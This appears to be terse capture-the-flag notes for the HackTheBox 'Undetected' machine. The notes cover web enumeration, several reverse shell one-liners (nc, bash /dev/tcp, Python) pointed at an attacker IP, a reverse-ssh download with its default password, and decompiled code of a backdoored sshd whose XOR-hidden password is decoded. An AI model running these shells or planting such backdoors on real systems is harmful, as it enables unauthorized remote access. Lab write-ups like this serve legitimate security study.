```
store.djewelry.htb
toughsky.djewelry.htb
```

enum
```xml
http://store.djewelry.htb/vendor/symfony/yaml/phpunit.xml.dist
<directory>./Tests</directory>
<directory>./vendor</directory>

```

```yaml
http://store.djewelry.htb/vendor/doctrine/instantiator/phpbench.json
{
    "bootstrap": "vendor/autoload.php",
    "path": "tests/DoctrineTest/InstantiatorPerformance"
}
```

```sh
ffuf -ic -w /usr/share/wordlists/dirb/common.txt -e '.html' -u "http://store.djewelry.htb/FUZZ"
```

```
nc -nlvp 1234
nc 10.10.14.2 1234 -e /bin/bash # not work
or
bash -i >& /dev/tcp/10.10.14.2/1234 0>&1 # not work
or
python3 -c 'import socket; from subprocess import run; from os import dup2;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.2",1234)); dup2(s.fileno(),0); dup2(s.fileno(),1); dup2(s.fileno(),2);run(["/bin/bash","-i"]);'
```

```
wget http://10.10.14.2:4444/upx_reverse-sshx64
ssh -p 31337 djewelry.htb
# Attacker (default password: letmeinbrudipls)
```

```
cat info

```

```
cd /var/mail
cd /etc/apache2
cd /usr/lib/apache2
ls -ltrh
```

```
Date: Sun, 25 Jul 2021 10:31:12 GMT
.....
-rw-r--r-- 1 root root  34K May 17  2021 mod_reader.so
```

```
wget http://10.10.11.146:4444/mod_reader.so
strings mod_reader.so


/usr/sbin/sshd

wget http://10.10.11.146:4444/sshd
```

```
ida64 sshd
auth_password function
```

```c
int auth_password(ssh *ssh,char *password)

{
  Authctxt *ctxt;
  passwd *ppVar1;
  int iVar2;
  uint uVar3;
  byte *pbVar4;
  byte *pbVar5;
  size_t sVar6;
  byte bVar7;
  int iVar8;
  long in_FS_OFFSET;
  char backdoor [31];
  byte local_39 [9];
  long local_30;
  
  bVar7 = 0xd6;
  ctxt = (Authctxt *)ssh->authctxt;
  local_30 = *(long *)(in_FS_OFFSET + 0x28);
  backdoor._28_2_ = 0xa9f4;
  ppVar1 = ctxt->pw;
  iVar8 = ctxt->valid;
  backdoor._24_4_ = 0xbcf0b5e3;
  backdoor._16_8_ = 0xb2d6f4a0fda0b3d6;
  backdoor[30] = '\xa5';
  backdoor._0_4_ = 0xf0e7abd6;
  backdoor._4_4_ = 0xa4b3a3f3;
  backdoor._8_4_ = 0xf7bbfdc8;
  backdoor._12_4_ = 0xfdb3d6e7;
  pbVar4 = (byte *)backdoor;
  while( true ) {
    pbVar5 = pbVar4 + 1;
    *pbVar4 = bVar7 ^ 0x96;
    if (pbVar5 == local_39) break;
    bVar7 = *pbVar5;
    pbVar4 = pbVar5;
  }
  iVar2 = strcmp(password,backdoor);
  uVar3 = 1;
  if (iVar2 != 0) {
    sVar6 = strlen(password);
    uVar3 = 0;
    if (sVar6 < 0x401) {
      if ((ppVar1->pw_uid == 0) && (options.permit_root_login != 3)) {
        iVar8 = 0;
      }
      if ((*password != '\0') ||
         (uVar3 = options.permit_empty_passwd, options.permit_empty_passwd != 0)) {
        if (auth_password::expire_checked == 0) {
          auth_password::expire_checked = 1;
          iVar2 = auth_shadow_pwexpired(ctxt);
          if (iVar2 != 0) {
            ctxt->force_pwchange = 1;
          }
        }
        iVar2 = sys_auth_passwd(ssh,password);
        if (ctxt->force_pwchange != 0) {
          auth_restrict_session(ssh);
        }
        uVar3 = (uint)(iVar2 != 0 && iVar8 != 0);
      }
    }
  }
  if (local_30 == *(long *)(in_FS_OFFSET + 0x28)) {
    return uVar3;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}

```

```
https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',31,false)From_Hex('Space')XOR(%7B'option':'Hex','string':'96'%7D,'Standard',false)&input=MHhhNQoweGE5ZjQKMHhiY2YwYjVlMwoweGIyZDZmNGEwZmRhMGIzZDYKMHhmZGIzZDZlNwoweGY3YmJmZGM4CjB4YTRiM2EzZjMKMHhmMGU3YWJkNg
```
## Referensi
- https://github.com/vulhub/vulhub/blob/master/phpunit/CVE-2017-9841/1.png
- https://ice-wzl.medium.com/netcat-shell-stabilization-248b83bcc06c
- https://www.linuxfordevices.com/tutorials/shell-script/reverse-shell-in-python
- https://github.com/Fahrj/reverse-ssh
- https://web.archive.org/web/20220309084547/https://0xdedinfosec.vercel.app/posts/hackthebox-undetected-writeup
- https://forum.hackthebox.com/t/official-undetected-discussion/252509/74